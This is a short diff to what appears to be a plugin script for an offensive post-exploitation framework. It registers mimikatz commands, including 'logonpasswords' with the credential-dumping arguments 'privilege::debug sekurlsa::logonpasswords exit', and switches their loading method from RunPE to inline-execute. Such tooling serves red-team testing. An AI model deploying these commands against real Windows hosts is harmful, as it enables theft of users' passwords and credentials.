@@ -3,7 +3,7 @@ mimikatz =
 AddCommand_W(
     "mimikatz",
     mimikatz,
-    "RunPE",
+    "inline-execute",
     "Get password credentials on windows",
     "mimikatz <args>"
 );
@@ -11,9 +11,9 @@ AddCommand_W(
 
 AddCommand_A(
     "logonpasswords",                                 --Command
-    mimikatz,                                         --Base64Compress
+     mimikatz,                                         --Base64Compress
     "privilege::debug sekurlsa::logonpasswords exit", --args
-    "RunPE",                                          --load Module
+    "inline-execute",                                          --load Module
     "Get password credentials on windows",            --Cescription
     "logonpasswords"                                  --usage
 );
